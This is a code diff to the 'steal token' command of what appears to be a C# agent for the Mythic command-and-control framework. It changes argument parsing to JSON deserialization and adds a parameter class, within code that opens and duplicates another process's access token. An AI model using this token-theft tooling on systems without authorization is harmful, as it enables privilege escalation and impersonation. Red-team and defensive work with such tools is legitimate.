@@ -6,6 +6,7 @@ using System;
 using System.Diagnostics;
 using System.Security.Principal;
 using System.Runtime.InteropServices;
+using System.Text;
 
 namespace Tasks.Commands
 {
@@ -17,9 +18,9 @@ namespace Tasks.Commands
         {
             MythicTaskResult result;
 
-            var Arguments = task.parameters.Split(' ');
+            var Arguments = Encoding.UTF8.GetBytes(task.parameters).Deserialize<StealTokenParam>();
 
-            if (!int.TryParse(Arguments[0], out var pid))
+            if (!int.TryParse(Arguments.pid, out var pid))
             {
                 result = new MythicTaskResult
                 {
@@ -52,10 +53,10 @@ namespace Tasks.Commands
                         status = "Error",
                         error = "Failed to open process token"
                     };
-                    
+
                     return result;
                 }
-                    
+
 
                 // duplicate token
                 var sa = new Native.Advapi.SECURITY_ATTRIBUTES();
@@ -132,5 +133,10 @@ namespace Tasks.Commands
 
             return result;
         }
+    }
+
+    public class StealTokenParam
+    {
+        public string pid { get; set; }
     }
 }
